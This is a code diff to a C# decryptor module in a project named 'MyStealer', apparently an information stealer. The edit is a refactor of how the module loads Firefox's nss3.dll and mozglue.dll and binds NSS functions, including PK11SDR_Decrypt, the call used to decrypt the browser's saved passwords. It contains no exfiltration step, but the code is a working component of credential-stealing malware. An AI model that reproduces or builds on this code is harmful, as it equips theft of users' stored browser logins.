@@ -4,7 +4,6 @@ using System.Runtime.InteropServices;
 using System.Collections.Generic;
 using System.Text;
 using MyStealer.Shared;
-using MyStealer.Collector;
 
 namespace MyStealer.Decryptor
 {
@@ -72,20 +71,20 @@ loaded:
             if (!File.Exists(Path.Combine(basePath, "nss3.dll")))
                 return false;
 
-            Mozglue = NativeMethods.LoadLibrary(Path.Combine(basePath, "mozglue.dll"));
-            NSS3 = NativeMethods.LoadLibrary(Path.Combine(basePath, "nss3.dll"));
+            Mozglue = LoadLibrary(Path.Combine(basePath, "mozglue.dll"));
+            NSS3 = LoadLibrary(Path.Combine(basePath, "nss3.dll"));
 
-            NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(NSS3, "NSS_Init"), typeof(NssInit));
-            NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown"), typeof(NssShutdown));
-            PK11_GetInternalKeySlot = (Pk11GetInternalKeySlot)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(NSS3, "PK11_GetInternalKeySlot"), typeof(Pk11GetInternalKeySlot));
-            PK11_FreeSlot = (Pk11FreeSlot)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(NSS3, "PK11_FreeSlot"), typeof(Pk11FreeSlot));
-            PK11_NeedLogin = (Pk11NeedLogin)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(NSS3, "PK11_NeedLogin"), typeof(Pk11NeedLogin));
-            PK11_CheckUserPassword = (Pk11CheckUserPassword)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(NSS3, "PK11_CheckUserPassword"), typeof(Pk11CheckUserPassword));
-            PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt"), typeof(Pk11sdrDecrypt));
-            SECITEM_ZfreeItem = (SECItemZfreeItem)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(NSS3, "SECITEM_ZfreeItem"), typeof(SECItemZfreeItem));
-            PORT_GetError = (PortGetError)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(NSS3, "PORT_GetError"), typeof(PortGetError));
-            PR_ErrorToName = (PrErrorToName)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(NSS3, "PR_ErrorToName"), typeof(PrErrorToName));
-            PR_ErrorToString = (PrErrorToString)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(NSS3, "PR_ErrorToString"), typeof(PrErrorToString));
+            NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "NSS_Init"), typeof(NssInit));
+            NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "NSS_Shutdown"), typeof(NssShutdown));
+            PK11_GetInternalKeySlot = (Pk11GetInternalKeySlot)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PK11_GetInternalKeySlot"), typeof(Pk11GetInternalKeySlot));
+            PK11_FreeSlot = (Pk11FreeSlot)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PK11_FreeSlot"), typeof(Pk11FreeSlot));
+            PK11_NeedLogin = (Pk11NeedLogin)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PK11_NeedLogin"), typeof(Pk11NeedLogin));
+            PK11_CheckUserPassword = (Pk11CheckUserPassword)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PK11_CheckUserPassword"), typeof(Pk11CheckUserPassword));
+            PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PK11SDR_Decrypt"), typeof(Pk11sdrDecrypt));
+            SECITEM_ZfreeItem = (SECItemZfreeItem)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "SECITEM_ZfreeItem"), typeof(SECItemZfreeItem));
+            PORT_GetError = (PortGetError)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PORT_GetError"), typeof(PortGetError));
+            PR_ErrorToName = (PrErrorToName)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PR_ErrorToName"), typeof(PrErrorToName));
+            PR_ErrorToString = (PrErrorToString)Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "PR_ErrorToString"), typeof(PrErrorToString));
             return true;
         }
 
@@ -174,8 +173,8 @@ loaded:
             if (disposing)
             {
                 NSS_Shutdown();
-                NativeMethods.FreeLibrary(NSS3);
-                NativeMethods.FreeLibrary(Mozglue);
+                FreeLibrary(NSS3);
+                FreeLibrary(Mozglue);
             }
         }
     }
